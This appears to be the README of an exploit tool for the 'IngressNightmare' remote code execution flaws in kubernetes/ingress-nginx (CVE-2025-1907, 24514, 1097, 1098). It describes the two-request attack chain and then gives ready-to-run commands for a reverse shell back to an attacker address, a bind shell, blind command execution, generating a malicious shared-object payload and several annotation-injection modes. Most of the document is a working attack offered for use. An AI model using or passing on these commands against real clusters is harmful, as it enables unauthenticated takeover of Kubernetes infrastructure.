# Ingress Nightmare CVE-2025-1907

## Description

This vulnerability allows remote attackers to execute arbitrary 
code on affected installations of kubernetes/ingress-nginx.
Authentication is not required to exploit this vulnerability.
The specific flaw exists within the handling of HTTP requests.

It is triggered by sending two request. One is a long buffered 
request to the NGINX server in same pod, then nginx will cache
it as a temporary file. The second request is a request to the
admission validating webhook server, which will trigger the 
admission webhook to write a temporary nginx config which contains
the `ssl_engine badso_location;` directive. Then the admission 
webhook will run `nginx -t` to check the config, which will 
triggered remote code execution in the context of the NGINX server.

## Exploitation

```bash
# reverse shell 
./ingressnightmare -m r -r ${ur_ip} -p ${port} -i ${INGRESS} -u ${UPLOADER} 

# bind shell # maybe lost?
./ingressnightmare -m b -b ${port} -i ${INGRESS} -u ${UPLOADER} 

# blind command execution
./ingressnightmare -m c  -c 'date >> /tmp/pwn; echo eson pwn >> /tmp/pwn' -i ${INGRESS} -u ${UPLOADER} 

# for CVE-2025-24514 - auth-url injection
# This is the default mode
./ingressnightmare -m c -c 'your command' -i ${INGRESS} -u ${UPLOADER} --is-auth-url 
# same as 
./ingressnightmare -m c -c 'your command' -i ${INGRESS} -u ${UPLOADER}
 
# for CVE-2025-1097 - auth-tls-match-cn injection,
./ingressnightmare -m c -c 'your command' -i ${INGRESS} -u ${UPLOADER} --is-match-cn --auth-secret-name ${secret_name}

# for CVE-2025-1098 – mirror UID injection -- all available
./ingressnightmare -m c -c 'your command' -i ${INGRESS} -u ${UPLOADER} --is-mirror-uid 

## Advanced usage
# Send only admission request
./ingressnightmare -m c -i ${INGRESS} --only-admission --only-admission-file /tmp/evil.so # --is-auth-url # --is-match-cn # --is-mirror-uid ...

# Send only upload request loop
./ingressnightmare -m c -c "your command" -u ${UPLOADER} --only-upload

# dry run mode
## dry run to lookup payload so
./ingressnightmare -m c -c 'your command' -u ${UPLOADER} --dry-run 
# dump with > /tmp/evil.so

## dry run to lookup raw nginx admission 
./ingressnightmare -m c -i ${INGRESS} --only-admission --only-admission-file /tmp/evil.so --dry-run # --is-auth-url # --is-match-cn # --is-mirror-uid ...

## verbose mode
./ingressnightmare -m c -c 'your command' -i ${INGRESS} -u ${UPLOADER} -v # debug 
./ingressnightmare -m c -c 'your command' -i ${INGRESS} -u ${UPLOADER} -vv # trace
./ingressnightmare -vv # -i ${INGRESS} -u ${UPLOADER} # -m c -c 'your command'
```

https://github.com/user-attachments/assets/415d6b81-b907-4aaa-bd99-18640bd64b2b


